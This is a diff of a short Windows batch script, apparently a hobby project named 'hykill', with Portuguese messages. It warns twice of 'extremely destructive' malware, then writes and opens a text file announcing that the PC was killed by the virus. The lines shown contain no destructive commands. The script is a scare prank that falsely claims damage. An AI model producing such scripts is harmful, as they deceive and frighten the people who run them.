@@ -1,7 +1,7 @@
 @echo off
 echo esse softoware e considerado um malware EXETREMAMENTE DESTRUTIVO vc quer mesmo continuar
 pause
-echo Aviso final vc quer mesmo fazer seu pc ficar inutilizavel
+echo Aviso final vc quer mesmo fazer seu PC ficar INUTILIZAVEL
 pause
 echo "Seu PC foi morto pelo virus hykill." > HYKILL.txt
 Start HYKILL.txt
